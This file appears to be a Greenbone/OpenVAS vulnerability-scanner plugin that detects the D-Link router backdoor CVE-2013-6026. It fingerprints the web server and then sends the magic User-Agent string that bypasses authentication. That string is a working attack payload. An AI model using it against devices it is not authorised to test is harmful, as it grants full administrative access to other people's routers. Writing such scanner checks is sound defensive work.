if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103810" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2013-6026" );
	script_bugtraq_id( 62990 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "D-Link Multiple Devices Backdoor" );
	script_xref( name: "URL", value: "http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/" );
	script_xref( name: "URL", value: "http://www.d-link.com/" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-10-14 19:24:10 +0200 (Mon, 14 Oct 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "thttpd-alphanetworks/banner" );
	script_tag( name: "impact", value: "This vulnerability allows remote attackers to gain complete
administrative access to affected devices." );
	script_tag( name: "vuldetect", value: "Try to bypass authentication by using 'xmlset_roodkcableoj28840ybtide' as HTTP User-Agent." );
	script_tag( name: "insight", value: "By setting the User-Agent header to 'xmlset_roodkcableoj28840ybtide', it is
possible to access the web interface without any authentication." );
	script_tag( name: "solution", value: "Ask the Vendor for an update." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Various D-Link DSL routers are susceptible to a remote authentication
bypass vulnerability." );
	script_tag( name: "affected", value: "Various D-Link routers are affected." );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || ( !ContainsString( banner, "thttpd-alphanetworks" ) && !ContainsString( banner, "Alpha_webserv" ) )){
	exit( 0 );
}
host = http_host_name( port: port );
req = "GET / HTTP/1.1\r\n" + "Host: " + host + "\r\n";
result = http_send_recv( port: port, data: req + "\r\n", bodyonly: FALSE );
if(!IsMatchRegexp( result, "HTTP/1.. (401|302)" ) || ContainsString( result, "self.location.href" )){
	exit( 0 );
}
req += "User-Agent: xmlset_roodkcableoj28840ybtide\r\n";
result = http_send_recv( port: port, data: req + "\r\n", bodyonly: FALSE );
if(IsMatchRegexp( result, "^HTTP/1\\.[01] 200" ) || ( !IsMatchRegexp( result, "HTTP/1" ) && ContainsString( result, "self.location.href" ) )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

